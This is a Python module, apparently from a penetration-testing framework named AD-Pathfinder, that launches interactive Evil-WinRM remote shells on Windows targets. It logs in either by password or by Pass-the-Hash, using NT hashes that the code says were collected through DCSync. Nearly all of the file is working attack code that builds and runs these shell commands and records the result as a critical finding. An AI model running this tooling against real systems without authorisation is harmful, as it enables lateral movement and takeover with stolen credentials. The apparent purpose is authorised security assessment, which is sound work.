"""
evil_winrm_module.py - Evil-WinRM Remote Shell module for AD-Pathfinder.

Provides remote shell access to Windows systems via WinRM (port 5985/5986).
Supports both password and Pass-the-Hash authentication.

Tools used:
    - evil-winrm  (gem install evil-winrm)

Commands (from playbook):
    # Password authentication
    evil-winrm -i <target_ip> -u <user> -p <pass>

    # Pass-the-Hash
    evil-winrm -i <target_ip> -u <user> -H '<nt_hash>'
"""

from __future__ import annotations

import os
import subprocess
import sys
from typing import Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from executor import CommandExecutor
from session import AssessmentState

try:
    from rich.console import Console
    from rich.prompt import Prompt
    from rich.table import Table
    from rich import box
    _RICH = True
    console = Console()
except ImportError:
    _RICH = False
    console = None  # type: ignore

# WinRM ports
WINRM_PORTS = {5985, 5986}


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _detect_evil_winrm(executor: CommandExecutor) -> bool:
    return executor.check_tool("evil-winrm")


def _pick_best_credentials(state: AssessmentState) -> dict:
    """Return best available credential set, preferring valid_credentials."""
    if state.valid_credentials:
        return state.valid_credentials[0]
    if state.initial_credentials.username:
        return {
            "username":  state.initial_credentials.username,
            "password":  state.initial_credentials.password,
            "ntlm_hash": state.initial_credentials.ntlm_hash,
        }
    return {"username": "", "password": "", "ntlm_hash": ""}


def _get_nt_hash_candidates(state: AssessmentState) -> list[dict]:
    """
    Return username+NT hash pairs from:
      1. state.ntlm_hashes (populated by DCSync)
      2. valid_credentials with ntlm_hash set
    """
    candidates = []
    for entry in getattr(state, "ntlm_hashes", []):
        if entry.get("nt") and entry.get("username"):
            candidates.append({"username": entry["username"], "nt": entry["nt"]})
    for cred in state.valid_credentials:
        if cred.get("ntlm_hash"):
            nt = cred["ntlm_hash"].split(":")[-1] if ":" in cred["ntlm_hash"] else cred["ntlm_hash"]
            candidates.append({"username": cred["username"], "nt": nt})
    return candidates


# ─────────────────────────────────────────────────────────────────────────────
# EvilWinRMModule
# ─────────────────────────────────────────────────────────────────────────────

class EvilWinRMModule:
    """
    Remote shell access via Evil-WinRM.

    Modes
    -----
    1. Password authentication:  evil-winrm -i <ip> -u <user> -p <pass>
    2. Pass-the-Hash:            evil-winrm -i <ip> -u <user> -H '<nt_hash>'

    The shell is launched interactively — control is handed to the operator.
    """

    def __init__(self, executor: Optional[CommandExecutor] = None) -> None:
        self.executor = executor or CommandExecutor(verbose=False)

    def run(self, state: AssessmentState) -> dict:
        """
        Launch Evil-WinRM shell.

        Returns
        -------
        dict
            {
                "status":  "success" | "error",
                "mode":    "password" | "pth",
                "user":    str,
                "command": str,
                "error":   str | None,
                "warnings":list[str],
            }
        """
        warnings: list[str] = []

        # ── Tool check ────────────────────────────────────────────────────
        if not _detect_evil_winrm(self.executor):
            return self._error(
                "evil-winrm not found. Install: gem install evil-winrm"
            )

        # ── Port check ────────────────────────────────────────────────────
        if WINRM_PORTS.isdisjoint(state.open_ports):
            warnings.append(
                "Port 5985/5986 not in open_ports. WinRM may not be available — "
                "run a port scan first or proceed manually."
            )

        # ── Mode selection ────────────────────────────────────────────────
        console.print()
        console.print("  [bold bright_cyan]Evil-WinRM — Remote Shell[/bold bright_cyan]\n")

        pth_candidates = _get_nt_hash_candidates(state)
        creds = _pick_best_credentials(state)

        console.print("  [bright_cyan]1.[/bright_cyan]  Password authentication")
        console.print("  [bright_cyan]2.[/bright_cyan]  Pass-the-Hash (NT hash)")
        console.print("  [bright_cyan]0.[/bright_cyan]  Cancel")
        console.print()

        mode_choice = Prompt.ask(
            "  [bold yellow]Select mode[/bold yellow]",
            choices=["0", "1", "2"],
            default="1",
        )

        if mode_choice == "0":
            return self._error("Cancelled by operator.")

        # ── Password mode ─────────────────────────────────────────────────
        if mode_choice == "1":
            username = Prompt.ask(
                "  [bold yellow]Username[/bold yellow]",
                default=creds.get("username", ""),
            ).strip()
            password = Prompt.ask(
                "  [bold yellow]Password[/bold yellow]",
                default=creds.get("password", ""),
            ).strip()

            # Exact playbook command: evil-winrm -i <ip> -u <user> -p <pass>
            cmd = ["evil-winrm", "-i", state.target_ip, "-u", username, "-p", password]
            redacted = f"evil-winrm -i {state.target_ip} -u {username} -p ****"
            mode = "password"

        # ── Pass-the-Hash mode ────────────────────────────────────────────
        else:
            username = creds.get("username", "")
            nt_hash = ""

            if pth_candidates:
                console.print("\n  [dim]Available hash candidates:[/dim]")
                for i, c in enumerate(pth_candidates[:10], 1):
                    console.print(f"    [bright_cyan]{i}.[/bright_cyan]  {c['username']}  [dim]{c['nt'][:16]}…[/dim]")
                console.print()
                idx_str = Prompt.ask(
                    "  [bold yellow]Select candidate # (or 0 to enter manually)[/bold yellow]",
                    default="1",
                )
                idx = int(idx_str) if idx_str.isdigit() else 0
                if 1 <= idx <= len(pth_candidates):
                    username = pth_candidates[idx - 1]["username"]
                    nt_hash  = pth_candidates[idx - 1]["nt"]

            if not nt_hash:
                username = Prompt.ask("  [bold yellow]Username[/bold yellow]", default=username).strip()
                nt_hash  = Prompt.ask("  [bold yellow]NT Hash[/bold yellow]").strip()

            # Exact playbook command: evil-winrm -i <ip> -u <user> -H '<nt_hash>'
            cmd = ["evil-winrm", "-i", state.target_ip, "-u", username, "-H", nt_hash]
            redacted = f"evil-winrm -i {state.target_ip} -u {username} -H '****'"
            mode = "pth"

        # ── Launch interactive shell ───────────────────────────────────────
        console.print(f"\n  [bold bright_cyan]Running:[/bold bright_cyan] [dim]{redacted}[/dim]")
        console.print("  [dim]Launching shell... type 'exit' to return to AD-Pathfinder.[/dim]\n")

        try:
            proc = subprocess.run(cmd)
            exit_code = proc.returncode
        except FileNotFoundError:
            return self._error("evil-winrm not found on PATH.")
        except KeyboardInterrupt:
            exit_code = 0

        console.print(f"\n  [bold yellow]Shell session ended (exit code: {exit_code}).[/bold yellow]\n")
        state.log_action(f"Evil-WinRM shell ({mode}): {username}@{state.target_ip}")
        state.log_finding(
            "Remote Shell",
            f"Evil-WinRM shell established ({mode}): {username}@{state.target_ip}",
            severity="CRITICAL",
        )

        return {
            "status":   "success",
            "mode":     mode,
            "user":     username,
            "command":  redacted,
            "error":    None,
            "warnings": warnings,
        }

    @staticmethod
    def _error(message: str) -> dict:
        return {
            "status":   "error",
            "mode":     "",
            "user":     "",
            "command":  "",
            "error":    message,
            "warnings": [],
        }


# ─────────────────────────────────────────────────────────────────────────────
# Convenience wrapper
# ─────────────────────────────────────────────────────────────────────────────

def run(state: AssessmentState, executor: Optional[CommandExecutor] = None) -> dict:
    """
    from modules.evil_winrm_module import run as winrm_run
    result = winrm_run(state)
    """
    return EvilWinRMModule(executor).run(state)
